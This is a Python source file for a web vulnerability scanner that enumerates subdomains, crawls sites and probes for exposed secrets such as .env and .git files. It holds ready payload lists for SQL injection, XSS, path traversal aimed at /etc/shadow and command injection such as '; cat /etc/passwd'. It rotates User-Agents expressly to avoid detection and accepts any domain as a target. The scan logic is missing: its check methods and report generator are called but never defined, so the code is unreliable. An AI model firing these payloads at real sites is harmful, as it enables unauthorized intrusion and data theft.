import sys
import argparse
import requests
import random
import threading # Not directly used in the final version with ThreadPoolExecutor for all tasks, but kept as it was in original.
import time
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_CENTER
from tqdm import tqdm
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
import dns.resolver
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
import logging
import os
from datetime import datetime

# Initialize colorama for colored console output
init(autoreset=True)

# Configure logging to capture informational messages and debug details
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# List of common User-Agent strings to mimic different browsers and avoid detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# Common web application parameters to test for vulnerabilities
COMMON_PARAMS = [
    "id", "page", "search", "q", "query", "item", "cat", "category", "user", "username", "email", "name",
    "file", "path", "url", "redirect", "next", "return", "callback", "jsonp", "action", "cmd", "exec",
    "system", "shell", "command", "debug", "admin", "test", "demo", "example", "sample", "template",
    "theme", "skin", "style", "lang", "language", "locale", "country", "region", "timezone", "format",
    "type", "kind", "sort", "order", "limit", "offset", "start", "end", "from", "to", "min", "max",
    "filter", "include", "exclude", "show", "hide", "view", "display", "output", "print", "export",
    "import", "upload", "download", "source", "src", "target", "dest", "destination", "ref", "referer",
    "token", "key", "secret", "password", "pass", "pwd", "hash", "code", "auth", "login", "logout",
    "register", "signup", "profile", "account", "settings", "config", "option", "param", "parameter",
    "data", "value", "content", "text", "message", "comment", "description", "title", "subject",
    "tag", "tags", "keyword", "keywords", "term", "terms", "phrase", "word", "words", "string"
]

# Payloads for SQL Injection testing
SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1", "' OR 1=1#", "') OR ('1'='1",
    "'; WAITFOR DELAY '0:0:5'--", "' OR sleep(5)--", "'; SELECT pg_sleep(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND '1'='1",
    "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "' UNION ALL SELECT NULL,NULL,NULL--",
    "' AND 1=1--", "' AND 1=2--", "' AND 'a'='a", "' AND 'a'='b",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
    "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "'; SELECT version()--", "' AND 1=CAST((SELECT version()) AS int)--",
    "' AND 1=1 AND '1'='1", "' AND 1=2 AND '1'='1", "' AND (SELECT 1)=1--",
    "' AND 1=1 AND sqlite_version()>'0'--",
    "' || '1'=='1", "' || 1==1//", "'; return true; var fake='",
    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--", "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>52--"
]

# Payloads for Cross-Site Scripting (XSS) testing
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<script>alert('XSS')</script>", "<script>alert(document.domain)</script>",
    "\"><svg/onload=alert(1)>", "<img src=x onerror=alert(1)>", "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>", "<select onfocus=alert(1) autofocus>", "<textarea onfocus=alert(1) autofocus>",
    "javascript:alert(1)", "';alert(1);//", "\";alert(1);//", "'-alert(1)-'", "\"-alert(1)-\"",
    "<ScRiPt>alert(1)</ScRiPt>", "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<svg><script>alert(1)</script></svg>", "<iframe src=javascript:alert(1)>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "\" onmouseover=\"alert(1)", "' onmouseover='alert(1)", "\" onfocus=\"alert(1)\" autofocus=\"",
    "<svg/onload=alert(1)>", "<img/src=x/onerror=alert(1)>", "<iframe/src=javascript:alert(1)>",
    "<script>alert`1`</script>", "<script>(alert)(1)</script>", "<script>window['alert'](1)</script>",
    "<style>@import'javascript:alert(1)';</style>", "<link rel=stylesheet href=javascript:alert(1)>",
    "<svg><foreignObject><iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(1)\"></iframe></foreignObject></svg>",
    "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
    "{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}", "${{7*7}}"
]

# Payloads for Path Traversal testing
PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "../../../../etc/shadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%2fetc%u002fpasswd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd", "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "../../../../etc/passwd%00", "../../../../etc/passwd%00.jpg",
    "../../../../etc/hosts", "../../../../proc/version", "../../../../proc/self/environ",
    "../../../windows/system32/drivers/etc/hosts", "../../../boot.ini",
    "../../../../var/log/apache2/access.log", "../../../../var/log/apache/access.log",
    "../../../apache/logs/access.log", "../../../xampp/apache/logs/access.log"
]

# Payloads for Command Injection testing
COMMAND_INJECTION_PAYLOADS = [
    "; ls", "| ls", "& ls", "&& ls", "|| ls", "`ls`", "$(ls)", "${ls}",
    "; id", "| id", "& id", "&& id", "|| id", "`id`", "$(id)", "${id}",
    "; whoami", "| whoami", "& whoami", "&& whoami", "|| whoami", "`whoami`", "$(whoami)",
    "; cat /etc/passwd", "| cat /etc/passwd", "&& cat /etc/passwd",
    "; ping -c 4 127.0.0.1", "| ping -c 4 127.0.0.1", "&& ping -c 4 127.0.0.1",
    "; sleep 5", "| sleep 5", "&& sleep 5", "|| sleep 5", "`sleep 5`", "$(sleep 5)"
]

# Payloads for LDAP Injection testing
LDAP_PAYLOADS = [
    "*", "*)(&", "*))%00", "*()|%26'", "*)(uid=*))(|(uid=*",
    "*)(|(password=*))", "*)(|(objectclass=*))", "*)(|(cn=*))",
    "admin)(&(password=*))", "admin)(&(|(password=*)(password=*))"
]

# Payloads for XPath Injection testing
XPATH_PAYLOADS = [
    "' or '1'='1", "' or 1=1 or ''='", "' or true() or ''='",
    "') or '1'='1", "') or 1=1 or (''='", "') or true() or (''='",
    "x' or 1=1 or 'x'='y", "x') or 1=1 or ('x'='y"
]

# Common subdomain prefixes for discovery
SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk", "ns2",
    "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test", "ns", "blog", "pop3",
    "dev", "www2", "admin", "forum", "news", "vpn", "ns3", "mail2", "new", "mysql", "old",
    "www1", "beta", "shop", "shopping", "mobile", "support", "search", "wap", "directory",
    "img", "api", "cdn", "media", "static", "app", "store", "web", "chat", "video", "email",
    "secure", "payment", "payments", "upload", "downloads", "download", "staging", "demo",
    "qa", "testing", "development", "prod", "production", "live", "api2", "v2", "v1", "cdn2"
]

# Common sensitive files and directories to check for exposure
SENSITIVE_FILES = [
    "/robots.txt", "/.env", "/.git/config", "/.htaccess", "/.htpasswd", "/web.config",
    "/config.php", "/config.json", "/config.yml", "/config.xml", "/config.ini",
    "/settings.py", "/admin", "/admin.php", "/admin.html", "/admin/", "/wp-admin",
    "/wp-login.php", "/login", "/login.php", "/signin", "/signin.php", "/register",
    "/register.php", "/backup", "/backup.zip", "/backup.sql", "/backup.tar.gz",
    "/dump.sql", "/db.sql", "/database.sql", "/backup/database.sql", "/phpinfo.php",
    "/info.php", "/test.php", "/debug.php", "/console", "/_profiler", "/phpmyadmin",
    "/dbadmin", "/pma", "/myadmin", "/sqlmanager", "/mysqlmanager", "/phpMyAdmin",
    "/phpmyadmin/", "/server-status", "/server-info", "/.well-known/security.txt",
    "/crossdomain.xml", "/clientaccesspolicy.xml", "/.svn/entries", "/.git/HEAD",
    "/.DS_Store", "/.idea/workspace.xml", "/.project", "/.settings", "/.travis.yml",
    "/package.json", "/composer.json", "/composer.lock", "/yarn.lock", "/Gemfile.lock",
    "/requirements.txt", "/Procfile", "/Dockerfile", "/docker-compose.yml",
    "/.dockerignore", "/.env.example", "/.env.local", "/.env.test", "/.env.production",
    "/.env.development", "/.env.staging", "/.env.dev", "/.env.prod", "/.env.qa"
]

# Standard HTTP methods to test for allowed methods
HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']

def print_banner():
    """Prints the ASCII art banner and tool information."""
    main_banner = r"""
░▒▓███████▓▒░ ░▒▓█▓▒░ ░▒▓██████████████▓▒░  ░▒▓████████▓▒░ ░▒▓███████▓▒░  
░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░  ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
       ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
       ░▒▓█▓▒░         ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░  ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░
    """
    subtitle = "SiM0N Enhanced Vulnerability Scanner v2.1"
    print(Fore.GREEN + main_banner)
    print(Fore.RED + subtitle.center(80, "-"))
    print(Fore.YELLOW + "Features: Subdomain Discovery | Advanced Payloads | Parameter Mining | Live Domain Check | Status Code Filtering")
    print("\n")

def discover_subdomains(domain):
    """
    Discovers subdomains for a given domain using DNS queries and a common wordlist.
    Utilizes a ThreadPoolExecutor for concurrent DNS resolution.
    """
    subdomains = set()
    
    print(Fore.CYAN + f"[*] Discovering subdomains for {domain}...")
    
    def check_subdomain(sub):
        """Helper function to check if a subdomain resolves to an A record."""
        try:
            full_domain = f"{sub}.{domain}"
            dns.resolver.resolve(full_domain, 'A')
            return full_domain
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers, dns.exception.Timeout):
            # These exceptions indicate the subdomain does not exist or cannot be resolved
            return None
        except Exception as e:
            # Catch any other unexpected errors during DNS resolution
            logging.debug(f"Error resolving subdomain {sub}.{domain}: {e}")
            return None
    
    # Wrap the subdomain checks with tqdm for a progress bar
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_sub = {executor.submit(check_subdomain, sub): sub for sub in SUBDOMAIN_WORDLIST}
        for future in tqdm(as_completed(future_to_sub), total=len(SUBDOMAIN_WORDLIST), desc="Discovering Subdomains"):
            result = future.result()
            if result:
                subdomains.add(result)
                # print(Fore.GREEN + f"[+] Found subdomain: {result}") # Commented out to avoid cluttering progress bar
    
    return list(subdomains)

def check_live_domains(domains):
    """
    Checks which of the given domains are live and accessible by sending HTTP/HTTPS requests.
    Prioritizes HTTP, then tries HTTPS if HTTP fails.
    """
    live_domains = []
    
    def check_domain(domain):
        """Helper function to check if a single domain is live."""
        try:
            # Ensure URL has a scheme for requests
            url = f"http://{domain}" if not domain.startswith(('http://', 'https://')) else domain
            
            # Try HTTP first
            resp = requests.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, 
                                 timeout=10, allow_redirects=True)
            if resp.status_code == 200:
                return url
            
            # If HTTP failed or redirected, try HTTPS
            if url.startswith('http://'):
                https_url = url.replace('http://', 'https://')
                resp = requests.get(https_url, headers={'User-Agent': random.choice(USER_AGENTS)}, 
                                  timeout=10, allow_redirects=True)
                if resp.status_code == 200:
                    return https_url
        except requests.exceptions.RequestException as e:
            # Catch request-specific exceptions (e.g., connection errors, timeouts)
            logging.debug(f"Error checking live domain {domain}: {e}")
            pass # Continue to next domain if request fails
        except Exception as e:
            # Catch any other unexpected errors
            logging.debug(f"Unexpected error checking live domain {domain}: {e}")
            pass
        return None
    
    print(Fore.CYAN + f"[*] Checking {len(domains)} domains for accessibility...")
    
    # Wrap the domain checks with tqdm for a progress bar
    with ThreadPoolExecutor(max_workers=20) as executor:
        future_to_domain = {executor.submit(check_domain, domain): domain for domain in domains}
        for future in tqdm(as_completed(future_to_domain), total=len(domains), desc="Checking Live Domains"):
            result = future.result()
            if result:
                live_domains.append(result)
                # print(Fore.GREEN + f"[+] Live domain: {result}") # Commented out to avoid cluttering progress bar
    
    return list(live_domains)

def save_subdomains_to_file(subdomains, filename):
    """Save discovered subdomains to a separate file."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    subdomain_file = f"subdomains_{timestamp}_{filename.replace('.pdf', '.txt')}"
    
    try:
        with open(subdomain_file, 'w') as f:
            f.write(f"Subdomain Discovery Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Total Subdomains Found: {len(subdomains)}\n\n")
            
            for i, subdomain in enumerate(subdomains, 1):
                f.write(f"{i:3d}. {subdomain}\n")
        
        print(Fore.GREEN + f"[+] Subdomains saved to: {subdomain_file}")
        return subdomain_file
    except Exception as e:
        print(Fore.RED + f"[-] Error saving subdomains to file: {e}")
        return None

def extract_parameters_from_url(url):
    """Extracts query parameters from a given URL."""
    parsed = urlparse(url)
    return list(parse_qs(parsed.query).keys())

def find_form_parameters(url):
    """
    Finds form input names, select names, textarea names, and potential JavaScript
    parameters by parsing the HTML content of a given URL.
    """
    try:
        resp = requests.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=10)
        resp.raise_for_status() # Raise an exception for HTTP errors (4xx or 5xx)
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        params = set()
        
        # Find parameters from HTML forms (input, select, textarea tags)
        for form in soup.find_all('form'):
            for input_tag in form.find_all(['input', 'select', 'textarea']):
                name = input_tag.get('name')
                if name:
                    params.add(name)
        
        # Regex to find potential JS parameters (e.g., name="param", id="param", data-param="value")
        js_params = re.findall(r'(?:name|id|data-[\w-]+)\s*=\s*[\'"]?([\w_]+)[\'"]?', resp.text)
        params.update(js_params)
        
        # Extract parameters from links (href attributes)
        for link in soup.find_all('a', href=True):
            link_params = extract_parameters_from_url(link['href'])
            params.update(link_params)
        
        return list(params)
    except requests.exceptions.RequestException as e:
        logging.debug(f"Error fetching form parameters from {url}: {e}")
        return []
    except Exception as e:
        logging.debug(f"Unexpected error finding form parameters from {url}: {e}")
        return []

def crawl_urls(base_url, max_depth):
    """
    Enhanced URL crawler that explores links within the same domain up to a specified depth.
    It also extracts URL and form parameters during crawling.
    """
    visited = set()
    to_visit = [(base_url, 0)]
    found_urls = set([base_url])
    all_parameters = set()
    
    while to_visit:
        url, depth = to_visit.pop(0)
        if depth >= max_depth or url in visited:
            continue
        visited.add(url)
        
        try:
            # Extract parameters from the current URL's query string
            url_params = extract_parameters_from_url(url)
            all_parameters.update(url_params)
            
            # Find parameters within HTML forms on the current page
            form_params = find_form_parameters(url)
            all_parameters.update(form_params)
            
            # Fetch content of the current URL to find new links
            resp = requests.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=10)
            resp.raise_for_status() # Raise an exception for HTTP errors
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Find all anchor tags (links)
            for link in soup.find_all('a', href=True):
                abs_url = urljoin(url, link['href']) # Convert relative URLs to absolute
                parsed_abs_url = urlparse(abs_url)
                parsed_base_url = urlparse(base_url)

                # Ensure the discovered link stays within the same domain as the base URL
                # and has not been visited yet (to prevent infinite loops and redundant checks)
                if parsed_abs_url.netloc == parsed_base_url.netloc and abs_url not in found_urls:
                    # Normalize URL by removing query parameters and fragments for comparison
                    # This helps in avoiding duplicate entries for the same page with different query strings
                    normalized_url = urlunparse(parsed_abs_url._replace(query=None, fragment=None)) 
                    if normalized_url not in found_urls:
                        found_urls.add(normalized_url)
                        to_visit.append((abs_url, depth + 1)) # Add to queue for further crawling
        except requests.exceptions.RequestException as e:
            logging.debug(f"Error crawling {url}: {e}")
            continue
        except Exception as e:
            logging.debug(f"Unexpected error during crawling {url}: {e}")
            continue
    
    return list(found_urls), list(all_parameters)

class EnhancedVulnerabilityScanner:
    """
    Core class for performing various web vulnerability scans on a target URL.
    It leverages discovered parameters and a predefined set of payloads.
    """
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/') # Remove trailing slash for consistent URL handling
        self.vulnerabilities = [] # Stores all identified vulnerabilities
        self.parameters = set() # Stores parameters to test

    def scan(self, discovered_params=None):
        """
        Initiates the scanning process for various vulnerability types.
        Combines common parameters with any newly discovered ones.
        """
        if discovered_params:
            self.parameters.update(discovered_params)
        self.parameters.update(COMMON_PARAMS) # Add common parameters for comprehensive testing
        
        print(Fore.CYAN + f"[*] Scanning {self.target_url} with {len(self.parameters)} parameters...")
        
        # Execute checks for different vulnerability types
        self.check_sql_injection()
        self.check_xss()
        self.check_path_traversal()
        self.check_command_injection()
        self.check_ldap_injection()
        self.check_xpath_injection()
        self.check_clickjacking()
        self.check_open_redirect()
        self.check_sensitive_files()
        self.check_http_methods()
        self.check_security_headers()
        
        return self.categorize_vulnerabilities()

    def categorize_vulnerabilities(self):
        """Categorizes identified vulnerabilities by their severity level."""
        severity_map = {
            'SQL Injection': 'Critical',
            'Command Injection': 'Critical',
            'XSS': 'High',
            'Path Traversal': 'High',
            'LDAP Injection': 'High',
            'XPath Injection': 'High',
            'Open Redirect': 'Medium',
            'Sensitive File/Directory': 'Medium',
            'HTTP Methods': 'Medium',
            'Security Headers': 'Low',
            'Clickjacking': 'Low'
        }
        categorized = {'Critical': [], 'High': [], 'Medium': [], 'Low': []}
        for vuln in self.vulnerabilities:
            severity = severity_map.get(vuln['type'], 'Low') # Default to 'Low' if type not mapped
            categorized[severity].append(vuln)
        return categorized

    def send_request(self, url, params=None, method='GET', data=None):
        """
        Sends an HTTP request to the specified URL with given parameters and method.
        Handles User-Agent headers and basic error logging.
        """
        headers = {'User-Agent': random.choice(USER_AGENTS)} # Rotate User-Agents
        try:
            if method.upper() == 'POST':
                resp = requests.post(url, data=data, headers=headers, timeout=10, allow_redirects=True)
            else: # For GET or other methods, parameters are typically in the URL query string
                if params:
                    parsed_url = urlparse(url)
                    query_params = parse_qs(parsed_url.query) # Parse existing query parameters
                    query_params.update(params) # Add/overwrite with new parameters
                    # Reconstruct the query string, handling potential list values from parse_qs
                    new_query = '&'.join([f"{k}={v[0] if isinstance(v, list) else v}" for k, v in query_params.items()])
                    url = urlunparse(parsed_url._replace(query=new_query)) # Rebuild URL with new query
                resp = requests.request(method, url, headers=headers, timeout=10, allow_redirects=True)
            # Don't raise for status here - we want to handle different status codes
            return resp
        except requests.exceptions.RequestException as e:
            logging.debug(f"Request failed for {url} ({method}): {e}")
            return None
        except Exception as e:
            logging.debug(f"Unexpected error in send_request to {url} ({method}): {e}")
            return None

    # Add more scan methods or utilities if needed here...

# === End of class ===

def main():
    print_banner()

    parser = argparse.ArgumentParser(description="SiM0N Enhanced Vulnerability Scanner")
    parser.add_argument('-d', '--domain', required=True, help='Target domain to scan')
    parser.add_argument('-o', '--output', default='scan_report.pdf', help='Output PDF report filename')
    parser.add_argument('-l', '--level', type=int, default=1, help='Crawling depth (default: 1)')
    parser.add_argument('--subdomains', action='store_true', help='Enable subdomain discovery')
    args = parser.parse_args()

    target = args.domain
    crawl_depth = args.level
    output_file = args.output

    targets = [target]
    if args.subdomains:
        domain = urlparse(target).netloc or target
        subdomains = discover_subdomains(domain)
        sub_file = save_subdomains_to_file(subdomains, output_file)
        live_subdomains = check_live_domains(subdomains)
        targets.extend(live_subdomains)

    all_findings = {'Critical': [], 'High': [], 'Medium': [], 'Low': []}

    for target_url in targets:
        print(Fore.CYAN + f"\n[•] Starting scan for: {target_url}")
        urls, params = crawl_urls(target_url, crawl_depth)
        print(Fore.CYAN + f"[•] Discovered {len(urls)} URLs with {len(params)} parameters.")

        for url in urls:
            scanner = EnhancedVulnerabilityScanner(url)
            results = scanner.scan(params)
            for severity, vulns in results.items():
                all_findings[severity].extend(vulns)

    print(Fore.GREEN + f"\n[+] Scan complete. Generating report: {output_file}")
    generate_report(output_file, all_findings)
    print(Fore.GREEN + "[✓] Done.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Scan interrupted by user.")
        sys.exit(1)
